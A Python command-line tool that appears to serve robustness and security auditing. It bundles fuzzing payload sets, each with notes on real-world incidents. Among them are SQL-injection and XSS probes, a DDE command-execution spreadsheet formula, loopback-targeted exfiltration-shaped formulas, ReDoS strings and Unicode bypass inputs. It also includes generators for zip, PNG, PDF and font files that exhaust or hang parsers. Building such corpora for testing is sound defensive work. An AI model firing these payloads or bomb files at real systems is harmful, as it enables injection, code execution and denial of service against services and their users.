#!/usr/bin/env python3
"""
psycho-agents payload corpus & crafted-artifact generators.

Every payload carries its origin story — read it before firing. Knowing WHY
'L'Aquila' breaks things (a legal Italian town name typed by a real user) is
what turns a fuzz result into an audit finding.

Usage:
    python payloads.py list
    python payloads.py get null-set [--format json|text]
    python payloads.py get all --format text
    python payloads.py make bomb-png --out bomb.png
    python payloads.py make zip-bomb --out bomb.zip [--mb 64]
    python payloads.py make cyclic-pdf --out loop.pdf
    python payloads.py make bomb-font --out bad.ttf
"""
import argparse
import json
import struct
import sys
import zlib
from datetime import datetime, timedelta, timezone

try:
    from zoneinfo import ZoneInfo
except ImportError:  # py<3.9
    ZoneInfo = None

# ---------------------------------------------------------------------------
# Payload sets
# ---------------------------------------------------------------------------

def _null_set():
    return [
        {"value": "NULL", "note": "the plate itself: accepted as data, conflated with SQL absence downstream",
         "origin": "Tartaro's California vanity plate (2016): blank-plate citations resolved to him — $12,049 in fines"},
        {"value": "null", "note": "language-literal lowercase; JS/JSON ecosystems treat this specially",
         "origin": "same class; JSON parsers and ORMs map the bare word in loose modes"},
        {"value": "Null", "note": "Christopher Null's surname — legal human value",
         "origin": "journalist Christopher Null: Amex dropped his surname; adds 'Null.' to force string treatment"},
        {"value": "None", "note": "Python None literal — 'if not value:' collapses this to missing",
         "origin": "Python ORMs and template layers treating the string 'None' as the None singleton"},
        {"value": "nil", "note": "Ruby/Lua/Vimscript absence marker", "origin": "same class in Ruby/Lua stacks"},
        {"value": "undefined", "note": "JS absence — some APIs store the literal string then compare loosely",
         "origin": "JS 'undefined == null' loose-equality leaks into persistence layers"},
        {"value": "NaN", "note": "float absence; breaks equality checks ('NaN != NaN') and sorting",
         "origin": "CSV/Excel exports of 'NaN' reparsed as float-not-a-number"},
        {"value": "0", "note": "falsy in every dynamic language — record with key 0 becomes 'empty'",
         "origin": "PHP/JS/Python truthiness: 0-valued business keys dropped by 'if not key'"},
        {"value": "false", "note": "boolean literal string; loose comparison makes it == 0 in some layers",
         "origin": "PHP 8 changed this, but the class survives in stored-value comparisons"},
        {"value": "", "note": "the empty string: is it a value or an absence? every stack answers differently",
         "origin": "the Tartaro case in reverse: the blank plate field itself"},
        {"value": "NUL", "note": "the ASCII control-character name; 'NUL' as text vs \\x00 as byte",
         "origin": "terminology collision between the spelled name and the control byte"},
        {"value": "\\x00abc", "note": "literal null byte mid-string: terminates C strings, breaks parsers early",
         "origin": "null-byte path traversal and C-string truncation bugs"},
        {"value": "\\N", "note": "Postgres COPY text-format NULL sentinel", "origin": "COPY FROM stdin treats backslash-N as NULL"},
        {"value": "null@null.com", "note": "whole email that reads as absence in every fragment",
         "origin": "compound: local part and domain both sentinel-valued"},
        {"value": "~", "note": "common 'default/absent' marker in query-param conventions", "origin": "API filter conventions using ~ for 'not set'"},
    ]

def _format_strings():
    reps = ["%s", "%n", "%x", "%X", "%p", "%d", "%i", "%u", "%c", "%f", "%e", "%g", "%hn", "%hhn", "%ln", "%In", "%jn", "%zn"]
    return [
        {"value": v, "note": f"printf conversion specifier {v} — user text reaching a format-string consumer",
         "origin": "Mazda 6 (2016): *99% Invisible* episode title containing %In crashed the infotainment system in a restart loop (Reply All, 2019)"}
        for v in reps
    ] + [
        {"value": "%s%s%s%s%s%s%s%s", "note": "arity underflow — runtimes that throw 'not enough arguments' will 500",
         "origin": "Python %-formatting and C printf both fail on missing arguments"},
        {"value": "%10000000x", "note": "width-field flood: one specifier demands a 10MB field",
         "origin": "printf width amplification — memory exhaustion via format width"},
        {"value": "%25s", "note": "URL-encoded %s — tests double-decode paths (logs that urldecode before printf)",
         "origin": "double-decoding pipelines"},
        {"value": "%2525s", "note": "double-encoded — triple-decode probes", "origin": "chained decode layers"},
        {"value": "%" * 2000, "note": "literal percent flood — padding/escaping bugs in percent-handling",
         "origin": "format-adjacent layers that escape % pairwise"},
        {"value": "%(a)s", "note": "Python named-format — KeyError surfaces internal variable names",
         "origin": "Python str %-dict interpolation with user-controlled format"},
    ]

def _metachars():
    return [
        {"value": "O'Brien", "note": "THE apostrophe name — if this 500s, real users break daily",
         "origin": "explainxkcd-documented: French/Italian/Irish users 'unwittingly trigger SQL injection' in US shops"},
        {"value": "L'Aquila", "note": "legal Italian city; apostrophe + non-ASCII combined",
         "origin": "the town real people type into address forms"},
        {"value": "D'Angelo", "note": "same class, different diaspora", "origin": "same"},
        {"value": "Müller", "note": "umlaut — encoding-sensitive round-trip probe", "origin": "German names in ASCII-assumed pipelines"},
        {"value": "Null.", "note": "Christopher Null's workaround — the period forces string treatment",
         "origin": "his literal production workaround for systems dropping his surname"},
        {"value": "\"><SRC=HTTPS://MJT.XSS.HT>", "note": "the actual registered UK company name shape",
         "origin": "Companies House 2020: registered as a company, later renamed 'THAT COMPANY WHOSE NAME USED TO CONTAIN HTML SCRIPT TAGS LTD'"},
        {"value": "<script>alert(1)</script>", "note": "classic stored-XSS probe — check the RENDERED DOM, not the source",
         "origin": "canonical XSS probe"},
        {"value": "<img src=x onerror=alert(1)>", "note": "event-handler XSS — survives some tag filters that block script",
         "origin": "filter-evasion classic"},
        {"value": "'\"--", "note": "minimal quote-break probe: close string, open comment",
         "origin": "SQL error-shape probe without destructiveness"},
        {"value": "'; DROP TABLE users; --", "note": "xkcd 327 'Little Bobby Tables' — use only to CONFIRM an already-suspected concat sink",
         "origin": "https://xkcd.com/327/"},
        {"value": "1' OR '1'='1", "note": "tautology auth-bypass probe", "origin": "classic authentication injection"},
        {"value": "&amp;&lt;&gt;", "note": "entity round-trip: does the app double-encode or decode stored entities?",
         "origin": "double-encoding corruption class"},
        {"value": "\"; waitfor delay '0:0:5' --", "note": "time-based blind probe (MSSQL shape) — response timing is the signal",
         "origin": "blind injection detection"},
    ]

def _four_byte():
    return [
        {"value": "😀", "note": "U+1F600 — 4 bytes UTF-8, impossible in utf8mb3/MySQL 'utf8'",
         "origin": "47,000-record incident (2026): characterEncoding=utf8 vs utf8mb4 — 38,100 records unrecoverable, ~$34,000 cost"},
        {"value": "👨‍👩‍👧‍👦", "note": "ZWJ family: 7 code points, 25 bytes — splits into 4 people if the sequence is broken",
         "origin": "ZWJ-sequence destruction in length-limited and surrogate-pair-truncating pipelines"},
        {"value": "🇮🇳", "note": "regional-indicator pair — flags are 2 code points that must stay together",
         "origin": "flag splitting: '🇮' alone renders as a boxed letter"},
        {"value": "👋🏽", "note": "skin-tone modifier (U+1F3FD) — 8 bytes; must survive as a unit",
         "origin": "modifier separation in naive truncation"},
        {"value": "∑ √ ∫ ≠ ≅", "note": "mathematical operators — several are 3-byte but ∑-adjacent BMP-ext members are probe-worthy; watch for font-render gaps too",
         "origin": "math symbols in utf8mb3 columns and math-font rendering failures"},
        {"value": "𠀀 𠀁", "note": "CJK Extension B — 4 bytes each, the classic utf8mb3 killer",
         "origin": "rare-character names (historical, names in academic registries)"},
        {"value": "☺️", "note": "text-presentation + VS16: 3 bytes + 3 bytes — presentation selectors must round-trip",
         "origin": "variation-selector stripping breaks emoji intent"},
        {"value": "😀😀😀😀😀😀😀😀😀😀", "note": "ten emoji = 40 bytes: passes a 10-CHARACTER limit, exceeds a 10-BYTE column",
         "origin": "the validator/sink unit-mismatch class (Agent 11 overlap)"},
        {"value": "👨‍👩‍👧‍👦👨‍👩‍👧‍👦👨‍👩‍👧‍👦", "note": "75 bytes, 21 code points, 3 graphemes — three different counting units disagree",
         "origin": "grapheme vs codepoint vs byte: the three-way disagreement"},
    ]

def _redos():
    def ladder(prefix, suffix, label, note):
        return {"value": prefix + suffix, "note": note, "origin": f"{label} — measure response time across the ladder to expose the exponent"}
    a30, a60, a120 = "a" * 30, "a" * 60, "a" * 120
    return [
        {"value": a30 + "!", "note": "kills (a+)+$ shapes — the Cloudflare/StackOverflow class",
         "origin": "Cloudflare WAF 2019: 27-minute global outage; Stack Overflow 2016: 34 minutes"},
        {"value": a60 + "!", "note": "same, one length step up — time should ~square if exponential", "origin": "length-ladder methodology"},
        {"value": a120 + "!", "note": "third rung; STOP here if rung 2 already took seconds — extrapolate instead", "origin": "responsible probing"},
        {"value": "a@" + a30 + ".com", "note": "email-validator killer: local part of repeated a's, non-matching TLD",
         "origin": "email regexes with nested quantifiers on the local part"},
        {"value": "a." * 30 + "!", "note": "dotted-run + failure: (\\w+\\.)* shapes", "origin": "URL/host validators"},
        {"value": "-" * 40 + "!", "note": "dash runs: [\\-\\w]* style patterns with backtracking", "origin": "slug/hostname validators"},
        {"value": "0" * 40 + ".", "note": "digit runs with terminator: IPv4/octet regexes", "origin": "IP validators with (\\d+\\.)*"},
        {"value": "%20" * 30 + "!", "note": "encoded-space runs in URL params", "origin": "query-string parsers with optional-segment regexes"},
        {"value": "a" * 32 + "b", "note": "generic (a+)+ probe with distinct terminal", "origin": "canonical catastrophic-backtracking input"},
        {"value": ("ab" * 25) + "c", "note": "alternation-bait: (a|ab)+ shapes", "origin": "alternation-with-self backtracking"},
        {"value": "(" * 20 + "a" + ")" * 20, "note": "nesting-bait for recursive parsers (also feeds T2-3)", "origin": "recursive-descent depth exhaustion"},
    ]

def _csv_formulas():
    return [
        {"value": "=2+5", "note": "BENIGN PROBE — if this cell shows 7 when opened in Excel, execution works; always lead with this",
         "origin": "safe detection probe for CSV/formula injection"},
        {"value": "=HYPERLINK(\"http://127.0.0.1:9/ping?d=1\",\"Click for details\")", "note": "exfil-shaped but loopback-only — proves outbound fetch without touching the internet",
         "origin": "Snipe-IT CVE-2026-86745: =HYPERLINK/=WEBSERVICE executed from admin CSV exports"},
        {"value": "=WEBSERVICE(\"http://127.0.0.1:9/x\")", "note": "WEBSERVICE function (Excel 2013+): automatic HTTP on open — loopback again",
         "origin": "same CVE class; automated data exfiltration"},
        {"value": "=cmd|'/C ping 127.0.0.1'!A0", "note": "DDE command execution shape (Windows Excel) — DIALOG-free variants exist",
         "origin": "DDE injection: command execution from a spreadsheet cell"},
        {"value": "+1+1", "note": "leading-plus formula: Excel treats + as formula start — guards that only check '=' miss it",
         "origin": "partial-guard bypass: '='-only escaping"},
        {"value": "-1+1", "note": "leading-minus formula — same guard gap", "origin": "partial-guard bypass"},
        {"value": "@SUM(1,1)", "note": "leading-@ implicit-intersection formula (Excel 365) — newest guard gap",
         "origin": "Excel 365 re-activated formulas via @ prefix"},
        {"value": "\t=2+5", "note": "TAB-prefixed formula: whitespace-first cells bypass first-char checks",
         "origin": "first-char-only guard bypass"},
        {"value": "\r=2+5", "note": "CR-prefixed formula — same class via carriage return", "origin": "first-char-only guard bypass"},
        {"value": "\n=2+5", "note": "LF-prefixed — complete the whitespace trio", "origin": "first-char-only guard bypass"},
        {"value": "'=2+5", "note": "the CORRECT escape (apostrophe prefix) — this is what a good exporter outputs; verify yours does",
         "origin": "the fix, expressed as a probe"},
    ]

def _length_illusion():
    return [
        {"value": "你好世界五字", "note": "7 chars, 21 bytes — passes char-limit, overflows byte-limit",
         "origin": "CJK names in VARCHAR columns sized by ASCII assumptions"},
        {"value": "😀😀😀", "note": "3 chars, 12 bytes, 3 graphemes — 4× byte inflation", "origin": "emoji display names"},
        {"value": "e" + "\u0301" * 20, "note": "1 visible grapheme, 21 code points — normalization bombs length checks",
         "origin": "combining-mark stacking"},
        {"value": "👨‍👩‍👧‍👦" * 3, "note": "3 graphemes, 21 code points, 75 bytes: every counting unit disagrees",
         "origin": "ZWJ sequences × repetition"},
        {"value": "ﬁ" * 10, "note": "10 chars now, 20 chars after NFKC (ﬁ→fi): length checks pass pre-normalization, storage overflows post",
         "origin": "expansion-under-normalization (T2-1 overlap)"},
        {"value": "ＡＢＣＤＥＦＧＨＩＪ", "note": "10 fullwidth chars = 30 bytes; NFKC→ASCII stays 10 — direction of expansion depends on layer",
         "origin": "fullwidth input in ASCII-sized columns"},
        {"value": "abc\x00def", "note": "null byte mid-string: C-string sinks see 'abc' — silent shortening",
         "origin": "null-byte truncation in C-based layers"},
        {"value": "A" * 10000, "note": "the blunt probe: ASPRunner.NET 10.1 crashed on exactly this shape",
         "origin": "10,000-character field crash (documented)"},
        {"value": "a" * 99 + "\U0001F600", "note": "100 chars ending in 4-byte char: truncation at byte-100 cuts mid-codepoint → replacement char � = corruption",
         "origin": "mid-codepoint truncation corruption"},
    ]

def _normalization():
    return [
        {"value": "ＮＵＬＬ", "note": "fullwidth NULL — passes ASCII allowlists? NFKC-collapses to 'NULL' downstream?",
         "origin": "CVE-2026-100674 (stoatchat): allowlist bypass via normalization quirks"},
        {"value": "admin＠example.com", "note": "FULLWIDTH COMMERCIAL AT (U+FF20): not an ASCII @ at validation, becomes one after NFKC",
         "origin": "Auth.js: validate-before-normalize let two-@ emails through to the mail library"},
        {"value": "𝐀𝐁𝐂", "note": "mathematical bold alphanumerics — NFKC-collapses to plain 'ABC'",
         "origin": "homoglyph/normalization bypasses"},
        {"value": "user①", "note": "circled digit (U+2460) — compatibility character with numeric decomposition",
         "origin": "NFKC compatibility class"},
        {"value": "ﬁle", "note": "ligature start — NFKC expands to 'file' (different string, different length)",
         "origin": "ligature expansion surprises"},
        {"value": "㌀", "note": "square-unit compatibility char — decomposes to multi-char string", "origin": "CJK compatibility class"},
        {"value": "e\u0301 vs é", "note": "composed vs decomposed é: NFC and NFD disagree — uniqueness checks on one form admit the other",
         "origin": "canonical-equivalence account collisions"},
        {"value": "ｱｲｳ", "note": "halfwidth katakana — normalizes to fullwidth in NFKC", "origin": "CJK width normalization"},
        {"value": "Ｐａｓｓｗｏｒｄ１２３", "note": "fullwidth password: if auth NFKC-normalizes, fullwidth 'Ａ' == 'A' — guessing got easier",
         "origin": "WildFly Elytron: NFKC on passwords weakened them"},
    ]

def _timezone_boundaries():
    out = []
    zones = {
        "America/New_York": "US DST: spring-forward gap (nonexistent local time) and fall-back overlap (ambiguous)",
        "Europe/Dublin": "EU DST transition",
        "Australia/Lord_Howe": "the 30-MINUTE DST zone — even correct-looking code handles it wrong",
        "Asia/Kolkata": "+05:30 — the Amadeus error shape: systems assuming whole-hour offsets",
        "Asia/Kathmandu": "+05:45 — the 45-minute zone almost nobody tests",
        "Australia/Eucla": "+08:45 — obscure 45-minute zone",
        "Pacific/Chatham": "+12:45 / +13:45 DST — 45-minute zone with DST",
        "America/St_Johns": "-03:30/-02:30 — North American half-hour zone",
    }
    if ZoneInfo:
        year = datetime.now().year
        for name, why in zones.items():
            try:
                z = ZoneInfo(name)
            except Exception:
                continue
            prev_off = None
            # hour-resolution scan of the current year to find real transitions
            t = datetime(year, 1, 1, tzinfo=timezone.utc)
            end = datetime(year + 1, 1, 1, tzinfo=timezone.utc)
            found = []
            while t < end and len(found) < 2:
                off = t.astimezone(z).utcoffset()
                if prev_off is not None and off != prev_off:
                    found.append((t, prev_off, off))
                prev_off = off
                t += timedelta(hours=1)
            for i, (inst, before, after) in enumerate(found):
                direction = "spring-forward gap" if after > before else "fall-back overlap"
                out.append({
                    "value": inst.astimezone(z).isoformat(),
                    "note": f"{name} {direction}: offset {before} -> {after}; local wall-clock {'jumps forward (a local hour never exists)' if after > before else 'repeats (a local hour happens twice)'}",
                    "origin": why,
                })
    out += [
        {"value": "2028-02-29T00:00:00+05:30", "note": "leap day — yearly-only code paths fire once per 4 years",
         "origin": "leap-day booking and billing bugs"},
        {"value": "23:59:59Z then 00:00:00Z", "note": "date rollover across zones: same instant, different dates in Kolkata vs UTC",
         "origin": "date-boundary reports and daily-aggregation windows"},
        {"value": "exp=iat", "note": "JWT zero-lifetime: valid exactly at issuance, expired one clock tick later — skew windows decide",
         "origin": "token-expiry boundary validation"},
        {"value": "exp=iat-1", "note": "already-expired-at-issue: strictly-invalid but skew tolerance may accept it",
         "origin": "clock-skew tolerance windows"},
        {"value": "iat=exp±60", "note": "just inside/outside a typical 60s skew tolerance — probe both sides",
         "origin": "same"},
    ]
    return out

def _human_legit():
    return [
        {"value": "Anne-Marie O'Brien", "note": "hyphen + apostrophe: two legal-name features at once",
         "origin": "Agent 13: users who are not trying to break anything"},
        {"value": "Núñez y Pérez", "note": "diacritics and surname particles", "origin": "Spanish naming conventions"},
        {"value": "李偉", "note": "CJK name: 2 chars, 6 bytes", "origin": "CJK legal names"},
        {"value": "Навальный", "note": "Cyrillic — different script entirely", "origin": "Cyrillic legal names"},
        {"value": "穆罕默德", "note": "Arabic-script name", "origin": "Arabic legal names"},
        {"value": "Dr. Jean-Luc Picard Jr.", "note": "honorific, hyphen, suffix — name parsers choke on each piece",
         "origin": "title/suffix parsing failures"},
        {"value": "L'Aquila, AQ 67100, Italia", "note": "full address with apostrophe city", "origin": "real Italian addresses"},
        {"value": "5, Rue de l'Église", "note": "French address: comma, apostrophe, accent", "origin": "real French addresses"},
        {"value": "+91 98765 43210", "note": "Indian mobile with country code and space grouping", "origin": "phone validators assuming US formats"},
        {"value": "NULL family reunion: the Nulls", "note": "a legitimate event name containing the sentinel", "origin": "Tartaro-class, everyday version"},
        {"value": "🏁 shipment #5 arrived", "note": "emoji in a business note — entirely normal user behavior since 2015",
         "origin": "the 47,000-record incident began with exactly this"},
        {"value": "Zürichstraße 10, München", "note": "German umlaut street/city", "origin": "real German addresses"},
    ]

def _css_stressors():
    fkv = "@font-feature-values Test {\n" + "\n".join(
        f"  @styleset {{ ss{i}: {i}; }}" for i in range(300)) + "\n}"
    return [
        {"value": fkv, "note": "300 font-feature definitions — the CSSFontFeatureValuesMap class",
         "origin": "Chrome CVE-2026-2441: actively exploited zero-day in CSSFontFeatureValuesMap — RAM spikes + renderer crashes"},
        {"value": ".a, " * 4000 + ".a { color: red; }", "note": "4000-entry selector list — parser recursion/allocation stress",
         "origin": "comma-list parsing stress; sibling of CVE-2026-113072 (CVSS 9.6)"},
        {"value": "@media screen { " * 120 + " .x{} " + "} " * 120, "note": "120-deep nested at-rules",
         "origin": "at-rule recursion"},
        {"value": ":is(" * 60 + ".a" + ")" * 60 + " {}", "note": "60-deep :is() nesting", "origin": "selector-list recursion"},
        {"value": "@counter-style a { system: cyclic; symbols: 'x'; } " * 2000, "note": "2000 counter-style rules",
         "origin": "rule-allocation flooding"},
        {"value": ".x { content: \"" + "A" * 100000 + "\"; }", "note": "100KB content string", "origin": "string-allocation stress"},
        {"value": ".g { grid-template-areas: " + " ".join(["\"" + "a " * 200 + "\""] * 200) + "; }", "note": "pathological grid-template",
         "origin": "grid parser stress"},
    ]

SETS = {
    "null-set": _null_set,
    "format-strings": _format_strings,
    "metachars": _metachars,
    "four-byte": _four_byte,
    "redos": _redos,
    "csv-formulas": _csv_formulas,
    "length-illusion": _length_illusion,
    "normalization": _normalization,
    "timezone-boundaries": _timezone_boundaries,
    "human-legit": _human_legit,
    "css-stressors": _css_stressors,
}

SET_NOTES = {
    "null-set": "sentinel/absence markers (Agent T1-1)",
    "format-strings": "printf conversion specifiers (T1-2)",
    "metachars": "legal human strings with SQL/HTML metacharacters (T1-3)",
    "four-byte": "4-byte UTF-8: emoji, ZWJ, CJK Ext-B (T1-4)",
    "redos": "catastrophic-backtracking inputs + length ladder (T2-2)",
    "csv-formulas": "spreadsheet formula injection, benign-first (T1-9)",
    "length-illusion": "char-count vs byte-count vs grapheme divergence (T1-11)",
    "normalization": "fullwidth/compat forms that normalize into different strings (T2-1)",
    "timezone-boundaries": "DST edges, half-hour zones, leap day, token skew (T1-7/T2-8)",
    "human-legit": "completely legitimate global names/addresses (T1-13)",
    "css-stressors": "engine-path CSS stressors (T2-10)",
}

# ---------------------------------------------------------------------------
# Crafted artifacts
# ---------------------------------------------------------------------------

def _png_chunk(tag: bytes, data: bytes) -> bytes:
    return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", zlib.crc32(tag + data) & 0xFFFFFFFF)

def make_bomb_png(path: str, width: int = 20000, height: int = 20000):
    """A ~200-byte PNG that DECLARES width x height. Decoders that trust IHDR
    before checking limits allocate width*height bytes — the CVE-2026-109398
    class (56KB PNG, 4000x4000, killed a PHP server)."""
    ihdr = struct.pack(">IIBBBBB", width, height, 8, 0, 0, 0, 0)  # 8-bit grayscale
    # one scanline (filter byte + width zeros), zlib-compressed — keeps the file
    # structurally plausible while the declared raster stays enormous
    row = b"\x00" + b"\x00" * width
    idat = zlib.compress(row, 9)
    png = b"\x89PNG\r\n\x1a\n" + _png_chunk(b"IHDR", ihdr) + _png_chunk(b"IDAT", idat) + _png_chunk(b"IEND", b"")
    with open(path, "wb") as f:
        f.write(png)
    declared = width * height
    return (f"wrote {path}: {len(png)} bytes on disk, declares {width}x{height} = "
            f"{declared:,} pixels ({declared * 1.0 / 1024 / 1024:.0f} MB grayscale buffer demand)")

def make_zip_bomb(path: str, mb: int = 64):
    """One entry of `mb` MB of zeros, DEFLATE-compressed. ~1000:1 expansion —
    the decompression-bomb class against unzip/extractall paths."""
    import zipfile, io
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
        z.writestr("payload.txt", b"\x00" * (mb * 1024 * 1024))
    with open(path, "wb") as f:
        f.write(buf.getvalue())
    return (f"wrote {path}: {len(buf.getvalue()):,} bytes on disk, expands to "
            f"{mb} MB ({mb / len(buf.getvalue()) * 1024:.0f}KB -> {mb*1024}KB, ratio ~"
            f"{mb * 1024 * 1024 / len(buf.getvalue()):.0f}:1)")

def make_cyclic_pdf(path: str):
    """A structurally-valid PDF whose xref trailer /Prev points at the xref
    table's own offset — parsers that follow Prev without cycle detection
    never terminate. The Pillow CVE-2026-42310 class."""
    header = b"%PDF-1.4\n"
    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    xref_off = len(header) + len(obj1) + len(obj2)
    xref = (b"xref\n0 3\n0000000000 65535 f \n"
            + f"{len(header):010d} 00000 n \n".encode()
            + f"{len(header) + len(obj1):010d} 00000 n \n".encode())
    trailer = f"trailer\n<< /Size 3 /Root 1 0 R /Prev {xref_off} >>\n".encode()
    tail = f"startxref\n{xref_off}\n%%EOF\n".encode()
    with open(path, "wb") as f:
        f.write(header + obj1 + obj2 + xref + trailer + tail)
    return (f"wrote {path}: trailer /Prev points at offset {xref_off} — the xref table itself. "
            f"Cycle-free parsers finish instantly; loop-vulnerable parsers spin forever.")

def make_bomb_font(path: str):
    """Minimal TrueType with unitsPerEm = 0 — the divide-by-zero shape of
    CVE-2026-110605 (libschrift). Parsers reading metrics before shaping
    hit the zero; robust ones reject the font."""
    def rec(tag, data):
        return tag + struct.pack(">III", 0, 0, len(data)) + data  # checksum left 0
    # head: 54 bytes; unitsPerEm at byte offset 18 within the table
    head = bytearray(54)
    struct.pack_into(">I", head, 0, 0x00010000)      # version
    struct.pack_into(">I", head, 4, 0x00010000)      # fontRevision
    struct.pack_into(">I", head, 12, 0x5F0F3CF5)     # magicNumber
    struct.pack_into(">H", head, 16, 0x000B)         # flags
    struct.pack_into(">H", head, 18, 0)              # unitsPerEm = 0  <-- the payload
    struct.pack_into(">h", head, 50, 0)              # indexToLocFormat
    maxp = struct.pack(">IH", 0x00005000, 1)         # v0.5, 1 glyph
    hhea = bytearray(36)
    struct.pack_into(">I", hhea, 0, 0x00010000)      # version
    struct.pack_into(">h", hhea, 4, 800)             # ascender
    struct.pack_into(">h", hhea, 6, -200)            # descender
    struct.pack_into(">h", hhea, 34, 1)              # numberOfHMetrics
    num_tables = 3
    entry_sel = 1
    search_range = 16 * (2 ** entry_sel)
    sfnt = struct.pack(">IHHHH", 0x00010000, num_tables, search_range, entry_sel, 16 * num_tables - search_range)
    tables = rec(b"head", bytes(head)) + rec(b"maxp", bytes(maxp)) + rec(b"hhea", bytes(hhea))
    with open(path, "wb") as f:
        f.write(sfnt + tables)
    return f"wrote {path}: {len(sfnt) + len(tables)} bytes, unitsPerEm=0 (CVE-2026-110605 shape)"

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_get(set_name: str, fmt: str):
    if set_name == "all":
        items = []
        for s, fn in SETS.items():
            for p in fn():
                q = dict(p)
                q["set"] = s
                items.append(q)
    elif set_name in SETS:
        items = SETS[set_name]()
    else:
        sys.exit(f"unknown set: {set_name}. `list` shows valid sets.")
    if fmt == "json":
        print(json.dumps(items, ensure_ascii=False, indent=2))
    else:
        for p in items:
            v = p["value"]
            if len(v) > 120:
                v = v[:117] + "..."
            print(f"{v!r}\t{p['note']}")

def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)
    sub.add_parser("list", help="list payload sets")
    g = sub.add_parser("get", help="print a payload set (json or text)")
    g.add_argument("set", choices=list(SETS) + ["all"])
    g.add_argument("--format", default="json", choices=["json", "text"])
    m = sub.add_parser("make", help="generate a crafted artifact file")
    m.add_argument("artifact", choices=["bomb-png", "zip-bomb", "cyclic-pdf", "bomb-font"])
    m.add_argument("--out", required=True)
    m.add_argument("--mb", type=int, default=64, help="zip-bomb uncompressed size in MB")
    args = ap.parse_args()

    if args.cmd == "list":
        for name, note in SET_NOTES.items():
            n = len(SETS[name]())
            print(f"  {name:22s} {n:3d} payloads — {note}")
        print("artifacts: bomb-png  zip-bomb  cyclic-pdf  bomb-font   (use `make`)")
    elif args.cmd == "get":
        cmd_get(args.set, args.format)
    elif args.cmd == "make":
        if args.artifact == "bomb-png":
            print(make_bomb_png(args.out))
        elif args.artifact == "zip-bomb":
            print(make_zip_bomb(args.out, args.mb))
        elif args.artifact == "cyclic-pdf":
            print(make_cyclic_pdf(args.out))
        elif args.artifact == "bomb-font":
            print(make_bomb_font(args.out))

if __name__ == "__main__":
    main()
